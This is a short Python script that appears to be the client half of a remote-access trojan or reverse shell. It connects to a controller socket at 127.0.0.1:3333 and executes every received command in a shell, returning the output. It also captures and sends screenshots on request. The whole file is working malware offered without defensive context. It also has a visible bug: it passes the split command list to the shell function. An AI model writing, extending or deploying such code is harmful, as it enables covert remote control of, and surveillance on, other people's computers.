import os
import socket
import random
import pyautogui
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = ('127.0.0.1', 3333)
sock.connect(addr)
CRTD = "<CRTD>"
FILE = "<FILE>"

def changes_dir(x):  #changes working dir
    os.chdir(x)
    sock.send(CRTD.encode())

def execute_cmd(x):  #executes commands on shell
    output = subprocess.getoutput(x)
    if output == "":
        sock.send(CRTD.encode())
    else:
        sock.send(output.encode())
       
def screenshot():   #function to capture screenshot
    scrn = pyautogui.screenshot()
    name = f"{random.randint(1,1000)}.jpeg"
    scrn.save(name)
    with open(name, "rb") as file:
        data = file.read()
        file.close()

    sock.send(FILE.encode())
    sock.send(name.encode())
    sock.send(data)

def command(cmd):   #validation and logic on recieved commmand 
    a = cmd.split()

    match a[0]:
        case "cd":
            changes_dir(a[1])
        case _:
            execute_cmd(a)

while True:
    response = sock.recv(1024).decode()
    print(f"Received: {response}")

    match response:
        case "screenshot":
            screenshot()
        case _:
            command(response)
